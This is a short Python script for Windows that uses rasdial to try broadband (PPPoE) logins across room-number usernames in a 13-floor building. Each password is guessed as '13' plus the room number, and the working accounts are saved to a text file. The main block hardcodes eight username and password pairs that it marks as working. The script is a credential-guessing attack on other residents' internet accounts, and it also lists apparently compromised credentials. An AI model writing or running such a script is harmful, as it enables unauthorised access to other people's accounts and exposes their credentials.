# -*- coding: utf-8 -*
# coding=utf-8
import os
import time


def connect(username, password):
    cmd_str = "rasdial %s %s %s" % ("宽带连接", username, password)
    res = os.system(cmd_str)
    print(res)
    if res == 0:
        print(u'连接成功！')
        return 'pass'
    else:
        print(u'账号无法使用')
        return 'fail'


def disconnect():
    cmd_str = "rasdial 宽带连接 /disconnect "
    os.system(cmd_str)
    print(u'断开成功！')


def generate():
    floor = 13
    number = 6
    room_no =[]
    for f in range(1, floor+1):
        if f < 10:
            f = '0' + str(f)
        else:
            pass
        for n in range(1, number+1):
            room = str(f) + '0' + str(n)
            room_no.append(room)
    return room_no


def writeEdit(info):
    my_file = 'Retract.txt'  # 文件路径
    '''
    if os.path.exists(my_file):  # 如果文件存在
        os.remove(my_file)  # 则删除
        print('删除成功')
    else:
        print('文件不存在')
    '''
    writeText = ''
    for text in info:
        writeText += '账号：' + text[0] + ' 密码：' + text[1] + '\n'
    file = open(my_file, 'w+')
    file.write(writeText)
    file.close()



def dial():
    disconnect()
    result = []
    connection = []
    for account in generate():
        passwd = '13' + account
        status = connect(account, passwd)
        tup = (account, passwd, status)
        result.append(tup)
        if status == 'pass':
            connection.append(tup)
            disconnect()
        elif status == 'fail':
            continue
    return result, connection


if __name__ == '__main__':
    a = [('0301', '130301', 'pass'), ('0302', '130302', 'pass'), ('0401', '130401', 'pass'), ('0505', '130505', 'pass'), ('0705', '130705', 'pass'), ('1103', '131103', 'pass'), ('1202', '131202', 'pass'), ('1205', '131205', 'pass')]
    run = writeEdit(a)
